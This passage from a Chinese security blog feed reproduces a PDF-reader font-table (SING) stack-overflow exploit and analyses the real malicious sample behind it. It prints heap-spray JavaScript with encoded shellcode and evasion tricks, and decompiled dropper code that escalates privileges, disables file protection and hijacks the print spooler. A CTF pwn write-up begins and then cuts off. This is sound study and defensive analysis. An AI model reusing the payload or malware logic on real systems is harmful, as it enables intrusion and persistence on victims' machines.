+&quot;%u0cc7%u0000%uf300%u4fa4%u07c6%u4722%u07c6%u5f00&quot; +&quot;\x25\x75858d\x25\x75fdb8\x25\x75ffff\x25\x7500e8\x25\x750000\x25\x758100\x25\x752404\x25\x750010&quot; +&quot;%u0000%u006a%uff50%u2477%u67ff%u6a20%uff00%u2c57&quot; +&quot;%u5553%u5756%u6c8b%u1824%u458b%u8b3c%u0554%u0178&quot; +&quot;%u8bea%u184a%u5a8b%u0120%ue3eb%u4932%u348b%u018b&quot; +&quot;%u31ee%ufcff%uc031%u38ac%u74e0%uc107%u0dcf%uc701&quot; +&quot;%uf2eb%u7c3b%u1424%ue175%u5a8b%u0124%u66eb%u0c8b&quot; +&quot;%u8b4b%u1c5a%ueb01%u048b%u018b%uebe8%u3102%u89c0&quot; +&quot;%u5fea%u5d5e%uc25b%u0008&quot;);// unescape(&quot;%u0c0c%u0c0c&quot;); 滑块代码 0x0c 等于指令 OR al, 0C; 大量执行对 shellcode 无影响var nop_chip = unescape(&quot;\x25\x750c0c\x25\x750c0c&quot;);// 65536 等于 0x10000 等于 2 ^ 16 等于 64KB, 这里的 20+8 应该是用来免杀用的，无实际作用while (nop_chip.length + 20 + 8 &lt; 65536)    nop_chip += nop_chip;// 精准堆喷，使 shellcode 开始的地方一定在 0c0c 结尾的地址 0x....0c0c 处temp_chip = nop_chip.substring(0, (0x0c0c - 0x24) / 2);temp_chip += shellcode; //拼接上 shellcode，该位置一定在 0c0c 结尾的地址处temp_chip += nop_chip; //拼接后续的滑块代码 // shellcode 小片段一个是 0x10000 大小，unicode 一个长度等于2字节，0x10000实际是 0x20000 字节大小，除2 为 0x10000small_shellcode_slide = temp_chip.substring(0, 65536 / 2);// 最终一个shellcode实际大小为 1MB，0x80000 * 2 = 0x100000 = 1MBwhile (small_shellcode_slide.length &lt; 0x80000)    small_shellcode_slide += small_shellcode_slide;// 从后面截短 0x1020 - 0x08 = 4120 字节，目的应该是让实际大小小于1MB，因为这里分配的一个堆块是1MB大小，shellcode_slide 应该小于堆块大小shellcode_slide = small_shellcode_slide.substring(0, 0x80000 - (0x1020 - 0x08) / 2);var slide = new Array();// 0x1f0 等于 496 ，也就是在内存中申请了接近 500 MB 的内存for (i = 0; i &lt; 0x1f0; i++)     slide[i] = shellcode_slide + &quot;s&quot;;// s 字符无实际作用，估计用于免杀</code></pre><p>可以看到上面代码首先是构造一个链条</p><pre><code class="hljs">var nop_chip = unescape(&quot;\x25\x750c0c\x25\x750c0c&quot;);// 65536 等于 0x10000 等于 2 ^ 16 等于 64KB, 这里的 20+8 应该是用来免杀用的，无实际作用while (nop_chip.length + 20 + 8 &lt; 65536)    nop_chip += nop_chip;</code></pre><p>上述代码可以近似看作拼接大量<code>nop</code>指令，然后我们精准堆喷，这里我们截取一下我们的构造链条，使得我们的shellcode能被存放在0x****0c0c,这里减去0x24，是因为堆头部会占据0x20字节，然后shellcode首部我们添加了4个‘A’</p><pre><code class="hljs">// 精准堆喷，使 shellcode 开始的地方一定在 0c0c 结尾的地址 0x....0c0c 处temp_chip = nop_chip.substring(0, (0x0c0c - 0x24) / 2);temp_chip += shellcode; //拼接上 shellcode，该位置一定在 0c0c 结尾的地址处</code></pre><p>然后我们将shellcode小片填充1MB大小，然后往我们准备的数组中不断填充数据，直到我们填满500的话就差不多用了500MB了</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/472309f790529822ae6a110992ca7bcb0b46d49b.jpg"></p><p>可以看到我们目前啥东西没开但是已经用了700M是哪儿来的了</p><h2 id="7-恶意样本分析"><a href="#7-恶意样本分析" class="headerlink" title="7.恶意样本分析"></a>7.恶意样本分析</h2><p>我们已经完成了样本分析过程，接下来我们来看看恶意代码的调试分析，首先是我们的调试界面，这里之前我们使用的分析样本是简单的执行一个计算器的打印，但是这里我们直接拿真正的恶意样本来进行分析，他名字是一个名企面试自助手册</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0b55b319ebc4b745d9899cdc8afc1e178b8215de.jpg"></p><p>此时我们像之前漏洞分析一样直接运行到恶意代码处，这里是call了一个值，我们步入查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/48540923dd54564ed271cff3f6de9c82d0584fe7.jpg"></p><p>恶意代码会从 kernel32.dll 中获取想要调用的函数地址。首先获取了 kernel32.dll 的基地址，0x4930044 处先赋值 ecx 为 0x30 ，fs[0x30] 处即为进程环境块 PEB 的指针，通过 PEB + 0xC 偏移处获取<br>PEB_LDR_DATA 结构体指针，PEB_LDR_DATA 偏移 0x1C 处获取<br><code>InInitializationOrderModuleList</code>成员指针，lods [esi] 获取双向链表当前节点的后继指针, 指向 kernel32.dll 节点，找到属于kernel32.dll的结点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址。获取加载基地址为 0x7C800000 ，保存在 ebx 中，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/4034970a304e251fc182cf32e286c9177e3e5386.jpg"></p><p>而上图中即将压入栈的0xC是我们即将寻找的函数数量，而我们上图中会运行到一个call函数，步入如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/738b4710b912c8fca5afdd07b9039245d788219f.jpg"></p><p>栈上第一个参数是第一个函数的hash，第二个为kernel32.dll的基地址，然后我们0x49302f8地址指令会将该基地址偏移0x3c的值赋给eax，这个0x3c是PE头部偏移量的存储位置，然后在PE头部偏移0x78处，也就是我们kernel32.dll导出表的虚拟地址0x262c赋值给edx，如下</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/1c950a7b02087bf4ca527c23b7d3572c10dfcfba.jpg"></p><p>此时我们的edx是存放着kernel32.dll导出表的虚拟地址的，此时我们再将偏移0x18和0x20的值分别存放在ecx和ebx中，这里的偏移分别保存着导出表函数的数目和导出表函数名称表的地址偏移</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c3361d7f5025f4c510fd8f9a14a.jpg"></p><p>然后我们继续单步，发现在0x493030F,这里，我们是将函数表中最后一个函数名称地址放入esi</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7a899e510fb30f24c604c7c98d95d143ac4b0359.jpg"></p><p>可以看到我们上面放入esi的函数名是<code>IstrenW</code>,然后我们在0x493031B处根据函数名计算hash，然后同之前我们压栈的hash([esp + 0x14])进行比较，若相同则继续往下走</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/fcfaaf51f3deb48fa3fb8a14b51f3a292cf5786d.jpg"></p><p>然后我们在cmp那里下一个条件断点，免得我们一直循环，我们选择conditional这条，然后条件写<code>esp == [esp+ 0x14]</code>,然后F9</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d6ca7bcb0a46f21f5fc47599b3246b600d33ae0c.jpg"></p><p>可以看到专门存放函数名的esi，此时是<code>ExitThread</code>，说明我们要寻找的函数就是他</p><ol><li>先在导出表偏移 0x24 处获取输出序号数组的地址</li><li>通过输出序号数组获取 ExitThread 函数的序号，其中 ECX 就是序号</li><li>获取函数地址数组</li><li>根据序号在函数地址数组中找到 ExitThread 函数的地址，保存在 eax 中，可以看到下图此时 eax 已经指ExitProcess 函数，猜测在实际中，ExitThread 函数即为 ExitProcess 函数</li></ol><p><img src="http://imgsrc.baidu.com/forum/pic/item/d62a6059252dd42ac7d72a61463b5bb5c8eab81a.jpg"></p><p>然后我们执行到这里会将其存放在[edi+ecx*4-0x4],</p><pre><code class="hljs">04930063    59              pop ecx04930064    89448F FC       mov dword ptr ds:[edi+ecx*4-0x4],eax   ; kernel32.ExitProcess04930068  ^ E2 EE           loopd short 04930058</code></pre><p>接下来接着循环，此时的ecx存放着我们想要解析的函数数目，这里可以看到我们是将eax指向的函数指针保存在内存中某个位置，我们同样在此处下一个条件断点，条件为<code>ecx == 1</code>,然后F9，此时执行完毕会发现对应内存填充了我们的函数地址</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d8f9d72a6059252d393237ce719b033b5ab5b9d7.jpg"></p><p>然后我们调用GetFileSize函数，若发现其大于，此处会一直遍历所有 handler 并获取文件大小，比较是否大于 0x2000，如果大于则跳转到 0x493008F。我们在此处下个断点，然后运行查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6159252dd42a2834dbd41cc11eb5c9ea14cebf8e.jpg"></p><p>大伙这里出了个问题，就是之前用计算器简单脚本所执行的iso88591没清理干净，导致运行始终不如意，这里我恢复虚拟机快照后重新编译了一遍，此时其他的基本没变，只是我们恶意代码的基地址变了一下，抱歉。</p><p>然后这里底下才是正确的返回值</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2fdda3cc7cd98d10172926fb643fb80e7aec907e.jpg"></p><p>可以看到我们目前esi指向的句柄为0x310，指向的eax为文件大小，为0x1CAD74，然后我们可以点击上面的H来查看一下内存中存在的句柄，可以发现恰好就是咱们的恶意文件pdf</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/21a4462309f7905241e96df449f3d7ca7acbd502.jpg"></p><p>接下来我们会调用函数<code>SetFRilePointer</code>，将函数指针偏移到文件0x1200的位置，这里就不逐步查看了，我们直接往下走，之后我们会调用<code>ReadFile</code>函数，读取该位置8字节到栈上0x0c0c0cFc</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fa129df81fafa40f4afb0518.jpg"></p><p>之后我们会检查一下几点固定值，若相等，则确定为恶意文件本身，然后我们调用<code>GlobalAlloc</code>函数，从堆中分配一定的字节，然后填充0，大小为我们之前获得的那个值，然后我们分配好空间后，再次调用<code>readFile</code>将恶意pdf读入内存中</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb1372a616d99854564e93584b28.jpg"></p><p>读出来后，使用异或解密 PDF 中的一个 stream 流对象</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/faedab64034f78f066308f393c310a55b2191cc4.jpg"></p><p>解密后可以看到标红这里有一个svrhost.exe字符串，他被拼接到右边栈0x0c0c0B40的临时目录地址上，然后我们调用<code>lcreate</code>函数来创建该临时文件，如下</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffc853caa78fc014a90f703eae2.jpg"></p><p>我们直接步过，然后到相应文件夹下查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b5050faf598c035e5dde6116ef6.jpg"></p><p>可以看到确实有这个文件了，然后我们交换前0x200个字节，使前 200 字节恢复成正常的 PE 文件格式，然后调用 lwrite 函数把解密后的 PE 文件写进 svrhost.exe 中</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2934349b033b5bb538ba353473d3d539b700bc8f.jpg"></p><p>再然后我们调用<code>WinExec</code>函数进行执行该可执行文件，我们将他复制一份到IDA中打开</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f7246b600c33874409eb39b6140fd9f9d62aa0ca.jpg"></p><p>IDA反编译得到下面main函数</p><pre><code class="hljs">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char *v3; // edi  char *v5; // edi  char *v7; // edi  HANDLE FileA; // eax  int v10; // eax  HANDLE v12; // eax  int v13; // eax  void (__stdcall *v14)(LPCSTR, LPCSTR, DWORD); // edi  CHAR CmdLine[1021]; // [esp+18h] [ebp-728h] BYREF  __int16 v16; // [esp+415h] [ebp-32Bh]  char v17; // [esp+417h] [ebp-329h]  CHAR Filename[257]; // [esp+418h] [ebp-328h] BYREF  __int16 v19; // [esp+519h] [ebp-227h]  char v20; // [esp+51Bh] [ebp-225h] BYREF  CHAR v21[257]; // [esp+51Ch] [ebp-224h] BYREF  __int16 v22; // [esp+61Dh] [ebp-123h]  char v23; // [esp+61Fh] [ebp-121h] BYREF  CHAR Buffer[257]; // [esp+620h] [ebp-120h] BYREF  __int16 v25; // [esp+721h] [ebp-1Fh]  char v26; // [esp+723h] [ebp-1Dh]  CPPEH_RECORD ms_exc; // [esp+728h] [ebp-18h]  memset(Buffer, 0, sizeof(Buffer));  v25 = 0;  v26 = 0;  GetSystemDirectoryA(Buffer, 0x104u);  v3 = &amp;v23;  while ( *++v3 )    ;  strcpy(v3, &quot;\\setup\\&quot;);  v5 = &amp;v23;  while ( *++v5 )    ;  strcpy(v5, &quot;hid128.log&quot;);  memset(v21, 0, sizeof(v21));  v22 = 0;  v23 = 0;  GetSystemDirectoryA(v21, 0x104u);  v7 = &amp;v20;  while ( *++v7 )    ;  strcpy(v7, &quot;\\cmd.exe&quot;);  memset(CmdLine, 0, sizeof(CmdLine));  v16 = 0;  v17 = 0;  sprintf(CmdLine, &quot;%s /c echo 12345&gt;%s&quot;, v21, Buffer);// 格式化输出                                                // C:\WINDOWS\system32\cmd.exe /c echo 12345&gt;C:\WINDOWS\system32\setup\hid128.log  WinExec(CmdLine, 0);  Sleep(0xBB8u);  FileA = CreateFileA(Buffer, 0x80000000, 1u, 0, 3u, 0x10000080u, 0);  if ( FileA == (HANDLE)-1 )  &#123;    v10 = 0;  &#125;  else  &#123;    CloseHandle(FileA);    v10 = 1;  &#125;  if ( v10 )    sub_402180();                               // 关闭文件保护函数  memset(Filename, 0, sizeof(Filename));  v19 = 0;  v20 = 0;  GetModuleFileNameA(0, Filename, 0x104u);  if ( !sub_402210(Filename) )  &#123;    sub_40321D(&quot;Not configed, exit...\r\n&quot;);    return -1;  &#125;  v12 = CreateFileA(Buffer, 0x80000000, 1u, 0, 3u, 0x10000080u, 0);  if ( v12 == (HANDLE)-1 )  &#123;    v13 = 0;  &#125;  else  &#123;    CloseHandle(v12);    v13 = 1;  &#125;  if ( !v13 )    return -1;  GetSystemDirectoryA(::Buffer, 0x104u);  *(_WORD *)&amp;::Buffer[strlen(::Buffer)] = 92;  strcat(::Buffer, &quot;spoolss.dll&quot;);  GetSystemDirectoryA(byte_4127E8, 0x104u);  *(_WORD *)&amp;byte_4127E8[strlen(byte_4127E8)] = 92;  GetSystemDirectoryA(byte_4128F0, 0x104u);  strcat(byte_4128F0, &quot;\\Setup\\&quot;);  GetSystemDirectoryA(byte_4129F8, 0x104u);  strcat(byte_4129F8, &quot;\\catroot\\&quot;);  strcat(ExistingFileName, byte_4127E8);  strcat(ExistingFileName, aSpoolsvExe);  strcat(byte_412C08, byte_4127E8);  strcat(byte_412C08, aSpoolerExe);  strcat(byte_412D10, byte_4128F0);  strcat(byte_412D10, aSetjupryExe);  strcat(NewFileName, byte_4128F0);  strcat(NewFileName, aFxjssocmExe);  strcat(byte_412F20, byte_4127E8);  strcat(byte_412F20, aMsxml0rDll);  strcat(FileName, byte_4127E8);  strcat(FileName, aMsxml0Dll);  strcat(byte_413130, byte_4128F0);  strcat(byte_413130, aMsxm32Dll);  ms_exc.registration.TryLevel = 0;  sub_401FA0(ServiceName);  dword_413234 = sub_401A00(byte_413130);  if ( dword_413234 )  &#123;    v14 = (void (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;    MoveFileExA(ExistingFileName, byte_412C08, 3u);    CopyFileA(NewFileName, ExistingFileName, 0);    if ( sub_401000(ExistingFileName, (int)aMsxml0rDll, (int)aEntrypoint) == 1 )      sub_40321D(&quot;Install Again Successfully!\r\n&quot;);    else      sub_40321D(&quot;Install Again Failed!\r\n&quot;);    sub_401CE0(ExistingFileName, ::Buffer);  &#125;  else  &#123;    CopyFileA(ExistingFileName, NewFileName, 0);    v14 = (void (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;    MoveFileExA(ExistingFileName, byte_412C08, 3u);    CopyFileA(NewFileName, ExistingFileName, 0);    if ( sub_401000(ExistingFileName, (int)aMsxml0rDll, (int)aEntrypoint) == 1 )      sub_40321D(&quot;New Install Successfully!\r\n&quot;);    else      sub_40321D(&quot;New Install Failed!\r\n&quot;);    CopyFileA(ExistingFileName, byte_412D10, 0);    CopyFileA(::Buffer, byte_413130, 0);    sub_401D70(byte_4128F0, byte_4129F8);    sub_401CE0(ExistingFileName, ::Buffer);  &#125;  sub_401AD0(ServiceName);  if ( sub_401A00(byte_412F20) )  &#123;    if ( sub_401A00(FileName) )      DeleteFileA(FileName);    v14(byte_412F20, FileName, 3u);    sub_402110(byte_412F20, &amp;unk_40B148, 0x6E00u);    sub_4023F0(byte_412F20);    if ( sub_401CE0(byte_412F20, ::Buffer) )      sub_40321D(&quot;Upgrade Success!\r\n&quot;);    else      sub_40321D(&quot;Upgrade Failed!\r\n&quot;);  &#125;  else  &#123;    sub_402110(byte_412F20, &amp;unk_40B148, 0x6E00u);    sub_4023F0(byte_412F20);    sub_401CE0(byte_412F20, ::Buffer);    sub_401CE0(ExistingFileName, ::Buffer);  &#125;  ms_exc.registration.TryLevel = -1;  sub_401E20(ServiceName);  sub_401B70(4205738);  return 1;&#125;</code></pre><p>可以看到该函数首先是创建了一个log文件，然后输出12345到其中，之后我们进入注释的关闭文件保护函数，点击查看</p><pre><code class="hljs">int __thiscall sub_402180(void *this)&#123;  HMODULE v1; // esi  unsigned __int16 Version; // ax  __int16 v3; // ax  HMODULE LibraryA; // eax  DWORD (__stdcall *ProcAddress)(LPVOID); // esi  void *v6; // eax  HANDLE v7; // eax  DWORD ThreadId; // [esp+0h] [ebp-4h] BYREF  ThreadId = (DWORD)this;  sub_4016F0();                                 // 提权函数，启用SeDebugPreviledge  sub_401780(&quot;Winlogon.exe&quot;);  v1 = 0;  Version = GetVersion();  if ( (_BYTE)Version == 5 )  &#123;    v3 = HIBYTE(Version);    if ( !(_BYTE)v3 )    &#123;      LibraryA = LoadLibraryA(&quot;sfc.dll&quot;);LABEL_7:      v1 = LibraryA;      goto LABEL_8;    &#125;    if ( (_BYTE)v3 == 1 || (_BYTE)v3 == 2 )    &#123;      LibraryA = LoadLibraryA(&quot;sfc_os.dll&quot;);      goto LABEL_7;    &#125;  &#125;LABEL_8:  ProcAddress = (DWORD (__stdcall *)(LPVOID))GetProcAddress(v1, (LPCSTR)2);  ThreadId = 0;  v6 = (void *)sub_4018B0(&quot;Winlogon.exe&quot;);  v7 = CreateRemoteThread(v6, 0, 0, ProcAddress, 0, 0, &amp;ThreadId);  WaitForSingleObject(v7, 0xFA0u);  return 0;&#125;</code></pre><p>其中函数<code>sub_4016F0()</code>是一个典型的提权函数，他的名字应该是<code>ElvatePriviledge</code>,他的作用是获取 SeDebugPrivilege 权限并设置 SE_PRIVILEGE_ENABLED 属性来开启权限，这里没符号表很难受,跟进查看如下</p><pre><code class="hljs">int sub_4016F0()&#123;  HANDLE CurrentProcess; // eax  HANDLE TokenHandle; // [esp+0h] [ebp-1Ch] BYREF  struct _LUID Luid; // [esp+4h] [ebp-18h] BYREF  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-10h] BYREF  CurrentProcess = GetCurrentProcess();  if ( !OpenProcessToken(CurrentProcess, 0x28u, &amp;TokenHandle) )    return 0;  if ( !LookupPrivilegeValueA(0, &quot;SeDebugPrivilege&quot;, &amp;Luid) )  &#123;    CloseHandle(TokenHandle);    return 0;  &#125;  NewState.Privileges[0].Luid = Luid;  NewState.PrivilegeCount = 1;  NewState.Privileges[0].Attributes = 2;  AdjustTokenPrivileges(TokenHandle, 0, &amp;NewState, 0x10u, 0, 0);  CloseHandle(TokenHandle);  return 1;&#125;</code></pre><p>然后回到主函数，该函数会串讲停止打印服务脚本并且运行,这里会有一个字符串<code>Spooler</code></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/86d6277f9e2f070884b338caac24b899a801f242.jpg"></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d4628535e5dde7118d62513ce2efce1b9c166143.jpg"></p><p>，我们用OD进行动态调试</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a2904b4c804dc25bc315d607cff.jpg"></p><p>我们跟进查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9815f29137c01213fb90e918d.jpg"></p><p>可以看到他会创建一个Temp_unstop.bat,然后我们写入内容</p><pre><code class="hljs">net stop &quot;Spooler&quot;net stop &quot;Spooler&quot;del &quot;C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\_unstop.bat&quot;</code></pre><p>他是为了关闭Spooler服务，然后删除自己。</p><pre><code class="hljs">void __cdecl sub_401FA0(const char *a1)&#123;  char *v1; // edi  HANDLE FileA; // esi  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-61Ch] BYREF  CHAR Buffer[257]; // [esp+18h] [ebp-618h] BYREF  __int16 v6; // [esp+119h] [ebp-517h]  char v7; // [esp+11Bh] [ebp-515h]  CHAR Filename[257]; // [esp+120h] [ebp-510h] BYREF  __int16 v9; // [esp+221h] [ebp-40Fh]  char v10; // [esp+223h] [ebp-40Dh]  CHAR v11[1021]; // [esp+228h] [ebp-408h] BYREF  __int16 v12; // [esp+625h] [ebp-Bh]  char v13; // [esp+627h] [ebp-9h]  memset(Buffer, 0, sizeof(Buffer));  v6 = 0;  v7 = 0;  GetTempPathA(0x104u, Buffer);  v1 = (char *)&amp;NumberOfBytesWritten + 3;  while ( *++v1 )    ;  strcpy(v1, &quot;_unstop.bat&quot;);  memset(Filename, 0, sizeof(Filename));  v9 = 0;  v10 = 0;  GetModuleFileNameA(0, Filename, 0x104u);  FileA = CreateFileA(Buffer, 0xC0000000, 1u, 0, 2u, 0x10000080u, 0);  if ( FileA != (HANDLE)-1 )  &#123;    memset(v11, 0, sizeof(v11));    v12 = 0;    v13 = 0;    wsprintfA(v11, &quot;net stop \&quot;%s\&quot;\r\nnet stop \&quot;%s\&quot;\r\ndel \&quot;%s\&quot; \r\n&quot;, a1, a1, Buffer);    NumberOfBytesWritten = 0;    WriteFile(FileA, v11, strlen(v11), &amp;NumberOfBytesWritten, 0);    CloseHandle(FileA);    ShellExecuteA(0, &quot;open&quot;, Buffer, 0, 0, 0);    Sleep(0x1388u);  &#125;&#125;</code></pre><p>之后我就不细讲了，这里涉及到的知识越来越难懂了，写了没什么意义，总的来说就是，svrhost.exe文件会在系统目录下生成其他病毒文件，同时篡改系统文件，然后他也会创建一系列bat批处理文件，要么是关闭服务，要么是删除自身以及病毒痕迹，或者说是加载恶意DLL，而该注入的恶意DLL文件就是msxml0r.dll文件.</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/1ad5ad6eddc451daea701121f3fd5266d1163271.jpg"></p><p>他经过PECompact加壳处理，他会得到3个URL地址然后不断发送HTTP请求，下载3个gif文件，可以猜测这三个gif文件中包含一些PE数据，用来执行恶意操作。最后我们的shellcode将会把PDF样本修改为正常文件，也就是删除了TTF字体的SING表。</p><p>可以看到PDF正常打开</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/9825bc315c6034a8716aa54b8e1349540823766b.jpg"></p><p>整个恶意PDF文件如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7dd98d1001e939012efb90f43eec54e737d1967a.jpg"></p><h2 id="8-整体过程"><a href="#8-整体过程" class="headerlink" title="8.整体过程"></a>8.整体过程</h2><p>不得不说自身还是太菜了，在后面恶意代码分析阶段差的不是一点半点，但好歹也把漏洞利用这部分搞明白了，总体流程归结于如下几点：</p><ol><li>strcat函数可以通过SING表的uniqueName字段来进行栈溢出</li><li>通过覆盖栈上的函数指针而不是返回值，使得后续调用该指针来绕过GS，也就是canary，然后进行ROP</li><li>使用heap spray来布置大量相同的shellcode。堆喷的脚本使用随机变量名、\x25替代%号来、添加无用代码来绕过杀毒软件分析</li><li>通过ROP来绕过DEP保护，也就是NX</li><li>其中ROP的构造我们利用未开启ALSR的模块来获取gadget，他的地址一般是固定的</li><li>由于我们的uniqueName可能不能太大，防止覆盖程序关键数据，因此我们此时使用两次栈迁移来到我们精准堆喷的地址，0x0c0c0c0c，我们将漏洞利用程序使用文件映射的一些函数映射到内存，然后将EIP指向他。</li><li>然后我们通过PEB环境控制块来获取kernel32.dll的基地址，从而获取一些需要运行的函数地址</li><li>通过异或和交换字符来对恶意PE文件进行加密</li><li>释放并且运行svchost.exe恶意文件，文件名同系统进程名一致，增加隐蔽性</li><li>提升权限，关闭系统文件保护，用来修改系统文件</li><li>修改打印服务程序spoolsv.exe的导入表，使得其在启动的时候加载恶意dll程序</li><li>修改文件时间等加密隐蔽性，然后运行完程序后，会删除没用的程序防止被发现</li><li>利用加壳防止逆向分析</li><li>远程下载恶意程序，最后修改恶意样本PDF文件为正常PDF并打开，假装我们是正常开启。</li></ol><h2 id="9-漏洞修复"><a href="#9-漏洞修复" class="headerlink" title="9.漏洞修复"></a>9.漏洞修复</h2><p>官方在之后修补该漏洞的时候，添加了字符串长度的检测和限制，用新的函数来替代了strcat函数，这样就避免了我们在栈上构造虚假函数指针</p><h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10.总结"></a>10.总结</h2><p>不得不说自己掌握的知识还是太少，上面整体过程中步骤从1~6是漏洞利用步骤看着还挺顺利，之后的步骤是恶意代码行为，对于恶意文件分析感觉自己对windows了解的太少了，之后还是先复现linux的漏洞再来看windows把。不过由于这是本人第一次进行漏洞复现，所以对于恶意代码也尽量硬着头皮看了看，但是发现自身对于windows的了解还是太少，看到后面还是挺折磨的，因此我下一步准备还是复现Linux方面的了。</p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>Windows</tag>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>I-SOON_2023</title>
    <link href="/2023/06/17/I-SOON-2023(pwn)/"/>
    <url>/2023/06/17/I-SOON-2023(pwn)/</url>
    
    <content type="html"><![CDATA[<h2 id="1-I-SOON-2023-harde-pwn"><a href="#1-I-SOON-2023-harde-pwn" class="headerlink" title="1. [I-SOON 2023]harde_pwn"></a>1. [I-SOON 2023]harde_pwn</h2><p>首先是检查题目情况</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/harde_pwn$ checksec pwn          [*] &#39;/home/dawn/Downloads/harde_pwn/pwn&#39;                                   Arch:     amd64-64-little                                              RELRO:    Full RELRO                                                   Stack:    No canary found                                              NX:       NX enabled                                                   PIE:      PIE enabled                                                  RUNPATH:  b&#39;../../tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/&#39;</code></pre><p>其中libc已经给出为2.35，第一反应是找IO利用链，但是这里我发现我自己是想太多了，如果题目给出栈情况，且版本较高，那就应该单利用栈就行了？何况还是pwn1。<br>虽说是pwn1但是还是没写出来，有个非栈上的格式化漏洞但就是不知道写哪儿。</p><p>首先分析反编译代码</p><pre><code class="hljs">_DWORD *fuxk_game()&#123;  _DWORD *result; // rax  char buf[28]; // [rsp+0h] [rbp-40h] BYREF  __int64 seed; // [rsp+1Ch] [rbp-24h]  int v3; // [rsp+24h] [rbp-1Ch] BYREF  int v4; // [rsp+28h] [rbp-18h]  int i; // [rsp+2Ch] [rbp-14h]  puts(&quot;Welcome to a ctype game!&quot;);  seed = randomm();  read(0, buf, 0x20uLL);  srand(seed);  for ( i = 0; i &lt;= 20; ++i )  &#123;    v4 = (rand() ^ 0x24) + 1;    puts(&quot;input: &quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;v3);    if ( v4 != v3 )    &#123;      puts(&quot;fuxk up!&quot;);      exit(1);    &#125;    puts(&quot;Success!&quot;);  &#125;  result = &amp;is_fmt;  is_fmt = 1;  return result;&#125;</code></pre><p>这里发现首先得过一下上面这个game，可以知道seed是由<code>/dev/urandom</code>而来，所以无法使用ctypes，但是我们发现后面有个buf溢出，可以覆盖到seed，所以我们覆盖为0再写一个简单的c就可以得出连续20个随机数，但这里其实可以用ctypes库了。</p><p>过了上面的函数之后就会有一个堆上的格式化字符串</p><pre><code class="hljs">void __noreturn heap_fmt()&#123;  char *ptr; // [rsp+8h] [rbp-8h]  for ( ptr = 0LL; ; printf(ptr) )  &#123;    ptr = (char *)realloc(ptr, 0x1000uLL);    my_write(&quot;input your data ;)\n&quot;);    read(0, ptr, 0x1000uLL);  &#125;&#125;</code></pre><p>这里我们发现无法跳出函数，且结束不了主函数，因此无法来通过格式化字符串来写返回值，比赛中我甚至想在栈上写一个堆地址，然后每次修改ptr值为0，导致realloc每次新分配一个0x1000的大块，最终打爆topchunk，再触发一下<code>malloc_assert</code>来使用house of cat,但最终还是没有实现。之后看师傅们的wp发现自己想太多了</p><p>得出结论在比赛中重要的还是<strong>调试</strong></p><p>回到题目中，既然无法达到调用printf的函数ret，那就修改printf的返回值就行，如下：</p><pre><code class="hljs">──────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────                         0x7f51addb181a &lt;printf+170&gt;     call   0x7f51addc60b0                &lt;0x7f51addc60b0&gt;                                                                                                                         0x7f51addb181f &lt;printf+175&gt;     mov    rdx, qword ptr [rsp + 0x18]                                     0x7f51addb1824 &lt;printf+180&gt;     sub    rdx, qword ptr fs:[0x28]                                        0x7f51addb182d &lt;printf+189&gt;     jne    printf+199                &lt;printf+199&gt;                                                                                                                                 0x7f51addb182f &lt;printf+191&gt;     add    rsp, 0xd8                                                     ► 0x7f51addb1836 &lt;printf+198&gt;     ret                                  &lt;0x556c83a69500; heap_fmt+92&gt;      ↓                                                                                                     0x556c83a69500 &lt;heap_fmt+92&gt;    jmp    heap_fmt+20                &lt;heap_fmt+20&gt;                         ↓                                                                                                     0x556c83a694b8 &lt;heap_fmt+20&gt;    mov    rax, qword ptr [rbp - 8]                                        0x556c83a694bc &lt;heap_fmt+24&gt;    mov    esi, 0x1000                                                     0x556c83a694c1 &lt;heap_fmt+29&gt;    mov    rdi, rax                                                        0x556c83a694c4 &lt;heap_fmt+32&gt;    call   realloc@plt                &lt;realloc@plt&gt;                     ────────────────────────────────────[ STACK ]────────────────────────────────────                      00:0000│ rsp 0x7ffe1c865e48 —▸ 0x556c83a69500 (heap_fmt+92) ◂— jmp    0x556c83a694b8                   01:0008│     0x7ffe1c865e50 ◂— 0x0                                                                     02:0010│     0x7ffe1c865e58 —▸ 